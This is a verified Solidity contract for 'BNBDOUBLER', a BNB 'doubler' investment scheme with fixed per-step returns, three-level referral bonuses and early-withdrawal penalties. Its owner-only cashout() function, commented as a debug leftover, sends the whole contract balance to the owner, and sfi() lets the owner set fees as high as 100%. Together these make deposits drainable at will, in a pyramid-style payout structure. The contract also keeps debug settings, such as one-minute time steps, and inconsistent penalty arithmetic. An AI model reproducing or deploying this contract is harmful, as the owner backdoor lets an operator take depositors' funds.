/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: MIT

/*
project resources 
website: https://bnbdoubler.com
telegram: https://t.me/busddoublercomcommunity                                                                     


   ___    _  _     ___     ___     ___    _   _    ___     _       ___     ___             ___     ___   __  __  
  | _ )  | \| |   | _ )   |   \   / _ \  | | | |  | _ )   | |     | __|   | _ \           / __|   / _ \ |  \/  | 
  | _ \  | .` |   | _ \   | |) | | (_) | | |_| |  | _ \   | |__   | _|    |   /     _    | (__   | (_) || |\/| | 
  |___/  |_|\_|   |___/   |___/   \___/   \___/   |___/   |____|  |___|   |_|_\   _(_)_   \___|   \___/ |_|__|_| 
_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 


*/


pragma solidity 0.8.19;



contract BNBDOUBLER {

    event Newbie(address user);
    event NewDeposit(address indexed user, uint8 plan, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event WithdrawReferalsBonus(address indexed user, uint256 amount);
    event WithdrawDeposit(address indexed user, uint256 index, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event FeePayedIn(address indexed user, uint256 totalAmount);
    event FeePayedOut(address indexed user, uint256 totalAmount);
    event ReinvestDeposit(address indexed user, uint256 index, uint256 amount);

    address public owner;
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    uint256 public totalInvested;
    uint256 public totalReInvested;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

    struct Deposit {
        uint8 plan;
        uint256 amount;
        uint256 start;
        uint256 checkpoint;
        uint256 penalty_collected;
    }

    struct Action {
        uint8 types;
        uint256 amount;
        uint256 date;
    }

    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256[3] levels;
        uint256 bonus;
        uint256 totalBonus;
        uint256 withdrawn;
        Action[] actions;
    }

    mapping(address => User) internal users;

    bool public started;
    address payable public commissionWallet;


    uint256[] public REFERRAL_PERCENTS = [10, 2, 1]; 
    uint256 public INVEST_MIN_AMOUNT = 10000000000000000; // 0.01 
    uint256 public INVEST_MAX_AMOUNT = 10000000000000000000000; // 10000 
    uint256 public PROJECT_FEE = 5; 
    uint256 constant public TIME_STEP = 1 minutes; // days - hours - minutes
    uint8 private planCurrent = 0;




    // IERC20 constant STABLE_TOKEN = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56); // busd_binance
    // IERC20 constant STABLE_TOKEN = IERC20(0x9C9e5fD8bbc25984B178FdCE6117Defa39d2db39); // busd_polygon
    // IERC20 constant STABLE_TOKEN = IERC20(0x55d398326f99059ff775485246999027b3197955); // usdt_binance
    // IERC20 constant STABLE_TOKEN = IERC20(0xc2132d05d31c914a87c6611c10748aeb04b58e8f); // usdt_polygon
    // IERC20 constant STABLE_TOKEN = IERC20(0x1D37Ee280Ee4f505c8BC6FB8a2625E557d945460); // tbusd_binance.testnet - custom token

    



    
    constructor() {
        owner = msg.sender;
        commissionWallet = payable(msg.sender);
        // plans.push(Plan(10, 20)); // 10 days, 20% day
        plans.push(Plan(20, 10));    // ❓ debug - 10, 10%
        plans.push(Plan(5, 5));      // ❓ debug - 10, 10%
        started = true; // ❓TODO DEBUG remove on PRODUCTION!
    }

    function startproject() public onlyOwner {
        started = true;
    }

    function deposit(address referrer) public payable {
        uint256 value = msg.value;
        require(started, "Not launched");
        
        require(value >= INVEST_MIN_AMOUNT, "Deposit value is too small");
        require(value <= INVEST_MAX_AMOUNT, "Deposit limit exceeded");
        require(planCurrent < plans.length, "Invalid plan");

        uint256 fee = 0;
        if (PROJECT_FEE > 0 ) {
            fee = ( value * PROJECT_FEE) / 100;
            commissionWallet.transfer(fee);
            // STABLE_TOKEN.transferFrom(msg.sender, commissionWallet, fee);
            emit FeePayedIn(msg.sender, fee);
        }

        User storage user = users[msg.sender];

        if (user.referrer == address(0)) {
            if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
                user.referrer = referrer;
            }

            address upline = user.referrer;
            for (uint256 i = 0; i < 3; i++) {
                if (upline != address(0)) {
                    users[upline].levels[i] = users[upline].levels[i] + 1;
                    upline = users[upline].referrer;
                } else break;
            }
        }

        if (user.referrer != address(0)) {
            address upline = user.referrer;
            for (uint256 i = 0; i < REFERRAL_PERCENTS.length; i++) {
                if (upline != address(0)) {
                    uint256 amount = ( value * REFERRAL_PERCENTS[i] ) / 100;
                    users[upline].bonus = users[upline].bonus + amount;
                    users[upline].totalBonus = users[upline].totalBonus + amount;
                    emit RefBonus(upline, msg.sender, i, amount);
                    upline = users[upline].referrer;
                } else break;
            }
        }


        if (user.deposits.length == 0) {
            user.checkpoint = block.timestamp;
            emit Newbie(msg.sender);
        }

        // BNB - already
        // STABLE_TOKEN.transferFrom(msg.sender, address(this), value - fee);

        user.deposits.push(Deposit(planCurrent, value, block.timestamp, block.timestamp, 0));
        user.actions.push(Action(0, value, block.timestamp));

        totalInvested = totalInvested + value;

        emit NewDeposit(msg.sender, planCurrent, value);
    }

    function withdrawreferalsbonus() public {
        User storage user = users[msg.sender];
        uint256 referralBonus = users[msg.sender].bonus;
        uint256 contractBalance = address(this).balance;
        // uint256 contractBalance = STABLE_TOKEN.balanceOf(address(this));
        
        require(referralBonus > 0, "User has no referal payments");
        require(contractBalance > referralBonus , "No enought balance. Try later");
        // ❓todo - not more self.deposit (goal - keep balance for 1 wave)

        if (referralBonus > 0) {
            user.bonus = 0;
        }
        
        user.withdrawn = user.withdrawn + referralBonus;
        user.actions.push(Action(2, referralBonus, block.timestamp));
        payable(msg.sender).transfer(referralBonus);
        // STABLE_TOKEN.transfer(msg.sender, referralBonus);
        emit WithdrawReferalsBonus(msg.sender, referralBonus);
    }

    function withdrawdeposit(uint256 index) public returns (
        uint256 _index,
        uint256 _withdraw,
        uint256 _penalty_amount
        
    ) {
        require(started, "Not launched");
        
        User storage user = users[msg.sender];

        uint256 withdraw = getUserDepositProfit(msg.sender, index);
        require(withdraw > 0, "No deposit amount");
        
        uint256 finish = user.deposits[index].start + plans[user.deposits[index].plan].time * TIME_STEP;
        if (finish > block.timestamp)
            user.deposits[index].checkpoint = block.timestamp; 
        else   
            user.deposits[index].checkpoint = finish; 

        user.withdrawn = user.withdrawn + withdraw;
        user.actions.push(Action(3, withdraw, block.timestamp));
        
        // penalty
        uint256 penalty_percent = 0;
        uint256 penalty_amount = 0;
        if (block.timestamp < finish) {
            penalty_percent = 100 - (block.timestamp - user.deposits[index].start) / TIME_STEP * (100 / plans[0].time);
            penalty_amount  = withdraw * penalty_percent / 100;
            user.deposits[index].penalty_collected = user.deposits[index].penalty_collected + penalty_amount;
        }

        payable(msg.sender).transfer(withdraw - penalty_amount);
        // STABLE_TOKEN.transfer(msg.sender, withdraw - penalty_amount);
        emit WithdrawDeposit(msg.sender, index, withdraw);

        if (PROJECT_FEE > 0 ) {
            uint256 fee = ( withdraw * PROJECT_FEE ) / 100;
            commissionWallet.transfer(fee);
            // STABLE_TOKEN.transfer(commissionWallet, fee);
            emit FeePayedOut(msg.sender, fee);
        }

        return (
            index,
            withdraw - penalty_amount, 
            penalty_amount
        );
    }

    function redeposit(uint256 index) public {
        User storage user = users[msg.sender];
        uint8 plan_id = 0;
        uint256 amount;
        uint256 start; 
        uint256 finish; 
        uint256 withdrawn;
        uint256 profit;
        // uint256 penalty_percent;
        // uint256 penalty_collected;
        (plan_id, amount, start, finish, withdrawn, profit,,) = getUserDepositInfo(msg.sender, index);

        require(profit > 0, "No deposit profit");
        
        if (finish > block.timestamp)
            user.deposits[index].checkpoint = block.timestamp; 
        else
            user.deposits[index].checkpoint = finish; 

        user.withdrawn = user.withdrawn + profit;
        user.actions.push(Action(4, profit, block.timestamp));

        uint8 plan_id_new = 0;
        if (block.timestamp > finish && withdrawn == 0) {
            plan_id_new = 1;
        }
        user.deposits.push(Deposit(plan_id_new, profit, block.timestamp, block.timestamp, 0));
        user.actions.push(Action(0, profit, block.timestamp));

        totalReInvested = totalReInvested + profit;

        emit ReinvestDeposit(msg.sender, index, profit);

        if (PROJECT_FEE > 0 ) {
            uint256 fee = ( profit * PROJECT_FEE) / 100;
            commissionWallet.transfer(fee);
            // STABLE_TOKEN.transfer(commissionWallet, fee);
            emit FeePayedOut(msg.sender, fee);
        }
    }

    // function getContractBalance() public view returns (uint256) {
    //     // return address(this).balance;
    //     return STABLE_TOKEN.balanceOf(address(this));
    // }

    // function getPlanInfo() public view returns (uint256 time, uint256 percent) {
    //     time = plans[0].time;
    //     percent = plans[0].percent;
    // }

    // function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
    //     return users[userAddress].withdrawn;
    // }

    // function getUserCheckpoint(address userAddress) public view returns (uint256) {
    //     return users[userAddress].checkpoint;
    // }

    // function getUserReferrer(address userAddress) public view returns (address) {
    //     return users[userAddress].referrer;
    // }

    // function getUserDownlineCount(address userAddress) public view returns (uint256[3] memory referrals) {
    //     return (users[userAddress].levels);
    // }

    // function getUserTotalReferrals(address userAddress) public view returns (uint256) {
    //     return users[userAddress].levels[0] + users[userAddress].levels[1] + users[userAddress].levels[2];
    // }

    // function getUserReferralBonus(address userAddress) public view returns (uint256) {
    //     return users[userAddress].bonus;
    // }

    // function getUserReferralTotalBonus(address userAddress) public view returns (uint256) {
    //     return users[userAddress].totalBonus;
    // }

    // function getUserReferralWithdrawn(address userAddress) public view returns (uint256) {
    //     return users[userAddress].totalBonus - users[userAddress].bonus;
    // }

    // function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
    //     return users[userAddress].deposits.length;
    // }

    function getUserTotalDeposits(address userAddress) public view returns (uint256 amount) {
        for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
            amount = amount + users[userAddress].deposits[i].amount;
        }
        return amount;
    }


    function getUserDepositsInfo(address userAddress) public view returns (
        uint256[] memory _index, 
        uint256[] memory _start, 
        uint256[] memory _finish, 
        uint256[] memory _amount, 
        uint256[] memory _withdrawn, 
        uint256[] memory _profit,
        bool[]    memory _is_finished
    ) {
       
        User storage user = users[userAddress];

        // uint256 cnt = user.deposits.length;
        uint256[] memory index       = new uint256[](user.deposits.length);
        uint256[] memory start       = new uint256[](user.deposits.length);
        uint256[] memory finish      = new uint256[](user.deposits.length);
        uint256[] memory checkpoint  = new uint256[](user.deposits.length);
        uint256[] memory amount      = new uint256[](user.deposits.length);
        uint256[] memory withdrawn   = new uint256[](user.deposits.length);
        uint256[] memory profit      = new uint256[](user.deposits.length);
        bool[]    memory is_finished = new bool[](user.deposits.length);
        
        for (uint256 i=0; i< user.deposits.length; i++) {
            uint8 plan_id = user.deposits[i].plan;
            index[i]  = i;
            amount[i] = user.deposits[i].amount;
            start[i]  = user.deposits[i].start;
            checkpoint[i] = user.deposits[i].checkpoint;
            finish[i] = user.deposits[i].start + plans[plan_id].time * TIME_STEP;
            uint256 share = (amount[i] * plans[plan_id].percent / 100);
            withdrawn[i] = share * (checkpoint[i] - start[i]) / TIME_STEP;
            is_finished[i] = withdrawn[i] >= amount[i] / 100 * (plans[plan_id].time * plans[plan_id].percent)  ? true : false;

            profit[i] = 0;
            if (checkpoint[i] < finish[i]) {
                uint256 from = start[i] > checkpoint[i] ? start[i] : checkpoint[i];
                uint256 to = finish[i] < block.timestamp ? finish[i] : block.timestamp;
                if (from < to) {
                    profit[i] = share * (to - from) / TIME_STEP;
                }
            }
        }
       
        return
        (
            index,
            start,
            finish,
            amount,
            withdrawn,
            profit,
            is_finished
        );
    }

    function getUserPenalties(address userAddress) public view returns (
        uint256[] memory _index,
        uint256[] memory _penalty_percent,
        uint256[] memory _penalty_amount,
        uint256[] memory _penalty_collected
    ) {
        User storage user = users[userAddress];
        uint256[] memory index       = new uint256[](user.deposits.length);
        uint256[] memory start       = new uint256[](user.deposits.length);
        uint256[] memory finish      = new uint256[](user.deposits.length);
        uint256[] memory amount      = new uint256[](user.deposits.length);
        uint256[] memory penalty_percent   = new uint256[](user.deposits.length);
        uint256[] memory penalty_amount    = new uint256[](user.deposits.length);
        uint256[] memory penalty_collected = new uint256[](user.deposits.length);

        (index, start, finish, amount,,,) = getUserDepositsInfo(userAddress);
       
        for (uint256 i=0; i < index.length; i++) {
            uint8 plan_id = user.deposits[i].plan;
            index[i] = i;
            
            penalty_percent[i] = 0;
            if (block.timestamp < finish[i]) {
                penalty_percent[i] = 100 - (block.timestamp - start[i]) / TIME_STEP  * (100 / plans[plan_id].time);
            }
            penalty_amount[i]  = amount[i] * penalty_percent[i] / 100;
            penalty_collected[i] = user.deposits[i].penalty_collected;
        } 
        return (
            index,
            penalty_percent,
            penalty_amount,
            penalty_collected
        );
    }

    function getUserDepositInfo(address userAddress, uint256 index) public view returns (
        uint8 plan_id,
        uint256 amount, 
        uint256 start, 
        uint256 finish, 
        uint256 withdrawn, 
        uint256 profit, 
        uint256 penalty_percent,
        uint256 penalty_collected
    ) {
        User storage user = users[userAddress];

        plan_id = user.deposits[index].plan;
        amount = user.deposits[index].amount;
        start = user.deposits[index].start;
        finish = user.deposits[index].start + plans[plan_id].time * TIME_STEP;
        uint256 checkpoint = user.deposits[index].checkpoint;
        uint256 share = user.deposits[index].amount * plans[plan_id].percent / 100;
        withdrawn = share * (checkpoint - start) / TIME_STEP;
        penalty_collected = user.deposits[index].penalty_collected;
        profit = 0;

        if (checkpoint < finish) {
            uint256 from = user.deposits[index].start > user.deposits[index].checkpoint ? user.deposits[index].start : user.deposits[index].checkpoint;
            uint256 to = finish < block.timestamp ? finish : block.timestamp;
            if (from < to) {
                profit = share * (to - from) / TIME_STEP;
            }
        }

        if (block.timestamp < finish) {
            penalty_percent = 100 - (block.timestamp - start) / TIME_STEP * (100 / plans[0].time);
        } else {
            penalty_percent = 0;
        }
    }

    function getUserDepositProfit(address userAddress, uint256 index) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 plan = user.deposits[index].plan;
        uint256 percent = plans[plan].percent;
        uint256 amount = user.deposits[index].amount;
        uint256 start = user.deposits[index].start;
        uint256 finish = user.deposits[index].start + plans[user.deposits[index].plan].time * TIME_STEP;
        uint256 checkpoint = user.deposits[index].checkpoint;
        uint256 profit = 0;

        if (checkpoint < finish) {
            uint256 share = (amount * percent) / 100;
            uint256 from = start > checkpoint ? start : checkpoint;
            uint256 to = finish < block.timestamp ? finish : block.timestamp;
            if (from < to) {
                profit = share * (to - from) / TIME_STEP;
            }
        }
        return profit;
    }

    function sfi(uint256 _value) public onlyOwner {
        require(_value <= 100, "Limit is fixed");
        PROJECT_FEE = _value;
    }
    function umin(uint256 _value) public onlyOwner {
        INVEST_MIN_AMOUNT = _value;
    }
    function umax(uint256 _value) public onlyOwner {
        INVEST_MAX_AMOUNT = _value;
    }
    

    // function getUserActions(address userAddress, uint256 index) public view returns (uint8[] memory, uint256[] memory, uint256[] memory) {
    //     require(index > 0, "wrong index");
    //     User storage user = users[userAddress];
    //     uint256 start;
    //     uint256 end;
    //     uint256 cnt = 50;

    //     start = (index - 1) * cnt;
    //     if (user.actions.length < (index * cnt)) {
    //         end = user.actions.length;
    //     }
    //     else {
    //         end = index * cnt;
    //     }

    //     uint8[]   memory types  = new  uint8[](end - start);
    //     uint256[] memory amount = new  uint256[](end - start);
    //     uint256[] memory date   = new  uint256[](end - start);

    //     for (uint256 i = start; i < end; i++) {
    //         types[i - start] = user.actions[i].types;
    //         amount[i - start] = user.actions[i].amount;
    //         date[i - start] = user.actions[i].date;
    //     }
    //     return
    //     (
    //         types,
    //         amount,
    //         date
    //     );
    // }

    // function getUserActionLength(address userAddress) public view returns (uint256) {
    //     return users[userAddress].actions.length;
    // }

    function getSiteInfo() public view returns (
        uint256 _totalInvested, 
        uint256 _totalReInvested, 
        uint256 _refPercent,
        uint256 _INVEST_MIN_AMOUNT,
        uint256 _INVEST_MAX_AMOUNT,
        uint256 _contractBalance
        ) 
    {
        return (
            totalInvested, 
            totalReInvested, 
            REFERRAL_PERCENTS[0],
            INVEST_MIN_AMOUNT,
            INVEST_MAX_AMOUNT,
            address(this).balance
            // STABLE_TOKEN.balanceOf(address(this))
        );
    }

    function getUserInfo(address userAddress) public view returns (
        uint256 totalDeposit, 
        uint256 totalWithdrawn, 
        uint256 totalReferrals,
        uint256 totalReferralBonus,
        uint256 totalReferralTotalBonus,
        uint256 totalReferralWithdrawn
        ) {
        return (
            getUserTotalDeposits(userAddress), 
            users[userAddress].withdrawn,
            users[userAddress].levels[0] + users[userAddress].levels[1] + users[userAddress].levels[2],
            users[userAddress].bonus,
            users[userAddress].totalBonus,
            users[userAddress].totalBonus - users[userAddress].bonus
            );
    }

    

    // debug - remove at prod❓
    function cashout() public onlyOwner { 
        payable(msg.sender).transfer(address(this).balance);
        // STABLE_TOKEN.transfer(msg.sender, STABLE_TOKEN.balanceOf(address(this)));
    }

    
}


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}